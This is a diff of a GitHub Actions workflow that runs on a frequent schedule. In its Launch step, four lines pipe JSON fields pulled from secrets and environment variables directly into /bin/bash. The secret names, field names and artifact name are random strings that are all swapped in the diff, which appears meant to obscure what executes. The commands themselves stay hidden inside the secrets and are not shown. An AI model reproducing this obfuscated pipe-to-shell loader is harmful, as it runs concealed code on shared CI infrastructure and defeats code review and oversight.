@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '29 4,10,16,22 * * *'
+    - cron: '32 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -19,16 +19,16 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          i6053: ${{ secrets.i6053 }}
+          lbe32944: ${{ secrets.lbe32944 }}
         run: |
-          printf '%s' "$i6053" | jq -r .mfzz0313 | /bin/bash
-          printf '%s' "$w7" | jq -r .dsbyr8 | /bin/bash
-          echo $rr84899 | jq -r .bo377 | /bin/bash
-          printf '%s' "$ceiia78295" | jq -r .dt229 | /bin/bash
+          printf '%s' "$lbe32944" | jq -r .v12989 | /bin/bash
+          echo $epcy14829 | jq -r .o17 | /bin/bash
+          echo $m28 | jq -r .whi45188 | /bin/bash
+          printf '%s' "$zwue3" | jq -r .nws6 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: 91cgLxZF
+          name: TLCHeabZ
           path: "*.zip"
           retention-days: 1
